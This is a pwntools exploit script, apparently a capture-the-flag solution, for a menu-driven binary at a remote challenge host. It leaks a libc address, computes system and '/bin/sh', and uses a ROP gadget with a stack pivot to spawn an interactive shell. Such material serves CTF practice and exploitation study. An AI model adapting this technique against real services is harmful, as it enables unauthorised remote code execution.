from pwn import *
import sys
remote_addr = ["node.yuzhian.com.cn",35854]
libc=ELF('./libc.so.6')
elf = ELF('./pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p, 'b *0x4008A7')

pop_rdi = p64(0x401573)
ret = p64(0x40101a)

ru(b'> \n')
sl(b'4')
ru(b'0x')
leak_addr = int(rc(12), 16)
pr('leak_addr', leak_addr)
libc_base = leak_addr - libc.sym['puts']
pr('libc_base', libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
ru(b'> \n')
sl(b'1')
ru(b'?\n')
s(p64(binsh))
sl(b'2')
ru(b'?\n')
s(pop_rdi)
ru(b'> \n')
sl(b'3')
ru(b'?\n')
s(p64(system))
ru(b'> \n')
sl(b'4')
ru(b'\n')
s(b'a' * 10 + p64(0x4050a0 - 8) + p64(0x40139e))

shell()
